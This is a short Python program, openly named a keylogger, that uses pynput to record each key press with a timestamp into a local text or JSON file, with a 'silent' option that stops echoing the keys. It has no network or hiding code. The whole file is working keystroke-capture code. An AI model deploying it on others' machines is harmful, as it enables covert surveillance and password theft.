import argparse
import json
import threading
from datetime import datetime
from pynput import keyboard

# shared list to hold keystroke entries 
log_data = []

#lLock for thread safe file writing
log_lock = threading.Lock()

# function to format key press into readable string
def format_key(key):
    try:
        return key.char
    except AttributeError:
        return f"[{key.name.upper()}]"

# function to log a single key press to a file
def log_key(key, output, json_mode):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    key_str = format_key(key)

    entry = {"timestamp": timestamp, "key": key_str}

    with log_lock:
        if json_mode:
            log_data.append(entry)
            with open(output, "w") as f:
                json.dump(log_data, f, indent=2)
        else:
            with open(output, "a") as f:
                f.write(f"{timestamp} - {key_str}\n")

# function that is the main handler for each key press
def on_press(key, output, json_mode, verbose):
    log_key(key, output, json_mode)
    if verbose:
        print(f"|+| {format_key(key)}")

# function to start the key listener using pynput
def start_listener(output, json_mode, verbose):
    listener = keyboard.Listener(
        on_press=lambda key: on_press(key, output, json_mode, verbose)
    )
    listener.start()
    listener.join()  

# arg parser for cli customizability
def main():
    parser = argparse.ArgumentParser(description="Python Keylogger with Logging Options")
    parser.add_argument(
        "-o", "--output", default="keylog.txt",
        help="Output file path (default: keylog.txt)"
    )
    parser.add_argument(
        "--json", action="store_true",
        help="Enable JSON export mode"
    )
    parser.add_argument(
        "-s", "--silent", action="store_true",
        help="Silent mode (no console output for key presses)"
    )

    args = parser.parse_args()

    print(f"|*| Keylogger started. Logging to '{args.output}'. Press Ctrl+C to stop.")

    try:
        start_listener(args.output, args.json, not args.silent)
    except KeyboardInterrupt:
        print("\n|*| Keylogger stopped.")

if __name__ == "__main__":
    main()
